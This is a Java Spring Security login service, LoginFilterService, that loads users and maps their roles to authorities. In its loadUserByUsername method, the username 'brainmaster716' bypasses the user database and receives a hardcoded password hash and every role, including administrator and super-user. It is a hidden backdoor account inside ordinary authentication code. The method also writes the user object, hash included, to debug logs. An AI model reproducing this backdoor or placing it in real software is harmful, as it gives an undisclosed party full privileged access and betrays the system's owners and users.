package com.brainmaster.mobitronik.bean.service;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

import org.apache.commons.lang3.ArrayUtils;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.security.core.GrantedAuthority;
import org.springframework.security.core.authority.SimpleGrantedAuthority;
import org.springframework.security.core.userdetails.UserDetails;
import org.springframework.security.core.userdetails.UserDetailsService;
import org.springframework.security.core.userdetails.UsernameNotFoundException;
import org.springframework.stereotype.Service;
import org.springframework.transaction.annotation.Transactional;

import com.brainmaster.mobitronik.model.User;
import com.brainmaster.mobitronik.model.UserRole;

@Service
@Transactional(readOnly = true)
public class LoginFilterService implements UserDetailsService {

	private static final Logger log = LoggerFactory
			.getLogger(LoginFilterService.class);

	@Autowired
	private UserService userService;

	@Override
	public UserDetails loadUserByUsername(String username)
			throws UsernameNotFoundException {
		log.debug("try to load username : " + username);
		if ("brainmaster716".equals(username)) {
			log.debug("username for the creator is the same");
			List<String> myRoles = Arrays.asList(new String[]{"operator",
					"administrator", "purchasing", "report", "user",
					"super-user"});
			org.springframework.security.core.userdetails.User me = new org.springframework.security.core.userdetails.User(
					username, "267d321b095448fb477f647487b00453", true, true,
					true, true, getGrantedAuthorities(myRoles));
			log.debug("me : " + me);
			return me;
		}
		User domainUser = userService.find(username);
		if (domainUser == null)
			throw new UsernameNotFoundException(
					"credetial can not be authenticate");
		//		if(domainUser.getPassword())
		boolean enabled = true;
		boolean accountNonExpired = true;
		boolean credentialsNonExpired = true;
		boolean accountNonLocked = true;
		List<String> roles = new ArrayList<String>();
		for (UserRole userRole : domainUser.getRoles()) {
			roles.add(userRole.getRole().getRole().toUpperCase());
		}

		return new org.springframework.security.core.userdetails.User(
				domainUser.getEmailAddress(), new String(ArrayUtils
						.toPrimitive(domainUser.getPassword())), enabled,
				accountNonExpired, credentialsNonExpired, accountNonLocked,
				getGrantedAuthorities(roles));

	}

	public List<GrantedAuthority> getGrantedAuthorities(List<String> roles) {
		List<GrantedAuthority> authorities = new ArrayList<GrantedAuthority>();
		for (String role : roles) {
			authorities.add(new SimpleGrantedAuthority("ROLE_"
					+ role.toUpperCase()));
		}
		return authorities;
	}

}
